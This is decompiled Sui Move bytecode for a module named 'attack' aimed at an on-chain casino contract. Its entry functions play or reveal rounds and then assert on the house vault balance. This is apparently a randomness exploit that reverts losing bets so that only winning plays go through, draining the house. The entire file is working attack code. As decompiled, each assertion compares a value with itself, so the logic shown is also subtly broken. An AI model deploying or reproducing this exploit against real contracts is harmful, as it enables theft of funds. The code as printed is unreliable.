module 0x289c0541ff98453ee4bcb5c2fce7c8c4cf6fa2ec910c4018e3957b7a9768c6d0::attack {
    entry fun claim_jason_winnings(arg0: 0x8b740c1cf1ed12ac1beced0ae600a2df151696545e40af16993aaaab9fe3d0::casino::RoundPayout<0x4ddca40b10ff92ccaa1b1797b14dc63ad15e0c87cb7b5669af9bdc49e11e8dab::suipump::SUIPUMP>, arg1: &mut 0x2::tx_context::TxContext) {
        0x8b740c1cf1ed12ac1beced0ae600a2df151696545e40af16993aaaab9fe3d0::casino::claim_jason_payout(arg0, arg1);
    }

    fun jason_vault_balance(arg0: &0x8b740c1cf1ed12ac1beced0ae600a2df151696545e40af16993aaaab9fe3d0::casino::JasonHouse) : u64 {
        let v0 = 0x2::bcs::new(0x1::bcs::to_bytes<0x8b740c1cf1ed12ac1beced0ae600a2df151696545e40af16993aaaab9fe3d0::casino::JasonHouse>(arg0));
        0x2::bcs::peel_address(&mut v0);
        0x2::bcs::peel_u64(&mut v0)
    }

    entry fun only_commitment_wins(arg0: 0x8b740c1cf1ed12ac1beced0ae600a2df151696545e40af16993aaaab9fe3d0::casino::RoundCommitment<0x2::sui::SUI>, arg1: &mut 0x8b740c1cf1ed12ac1beced0ae600a2df151696545e40af16993aaaab9fe3d0::casino::House, arg2: &0x8b740c1cf1ed12ac1beced0ae600a2df151696545e40af16993aaaab9fe3d0::casino::RevenueConfig, arg3: &0x2::random::Random, arg4: &0x2::clock::Clock, arg5: &mut 0x2::tx_context::TxContext) {
        0x8b740c1cf1ed12ac1beced0ae600a2df151696545e40af16993aaaab9fe3d0::casino::reveal_sui_round(arg0, arg1, arg2, arg3, arg4, arg5);
        assert!(vault_balance(arg1) < vault_balance(arg1), 0);
    }

    entry fun only_jason_wins(arg0: &mut 0x8b740c1cf1ed12ac1beced0ae600a2df151696545e40af16993aaaab9fe3d0::casino::JasonHouse, arg1: &0x8b740c1cf1ed12ac1beced0ae600a2df151696545e40af16993aaaab9fe3d0::casino::RevenueConfig, arg2: &0x2::random::Random, arg3: 0x2::coin::Coin<0x4ddca40b10ff92ccaa1b1797b14dc63ad15e0c87cb7b5669af9bdc49e11e8dab::suipump::SUIPUMP>, arg4: &mut 0x2::tx_context::TxContext) {
        0x8b740c1cf1ed12ac1beced0ae600a2df151696545e40af16993aaaab9fe3d0::casino::play_jason_round_claimable(arg0, arg1, 5, 0, false, arg3, arg2, arg4);
        assert!(jason_vault_balance(arg0) < jason_vault_balance(arg0), 0);
    }

    entry fun only_wins(arg0: &mut 0x8b740c1cf1ed12ac1beced0ae600a2df151696545e40af16993aaaab9fe3d0::casino::House, arg1: &0x8b740c1cf1ed12ac1beced0ae600a2df151696545e40af16993aaaab9fe3d0::casino::RevenueConfig, arg2: &0x2::random::Random, arg3: 0x2::coin::Coin<0x2::sui::SUI>, arg4: &mut 0x2::tx_context::TxContext) {
        0x8b740c1cf1ed12ac1beced0ae600a2df151696545e40af16993aaaab9fe3d0::casino::play_sui_round_claimable(arg0, arg1, 5, 0, false, arg3, arg2, arg4);
        assert!(vault_balance(arg0) < vault_balance(arg0), 0);
    }

    fun vault_balance(arg0: &0x8b740c1cf1ed12ac1beced0ae600a2df151696545e40af16993aaaab9fe3d0::casino::House) : u64 {
        let v0 = 0x2::bcs::new(0x1::bcs::to_bytes<0x8b740c1cf1ed12ac1beced0ae600a2df151696545e40af16993aaaab9fe3d0::casino::House>(arg0));
        0x2::bcs::peel_address(&mut v0);
        0x2::bcs::peel_u64(&mut v0)
    }

    // decompiled from Move bytecode v7
}

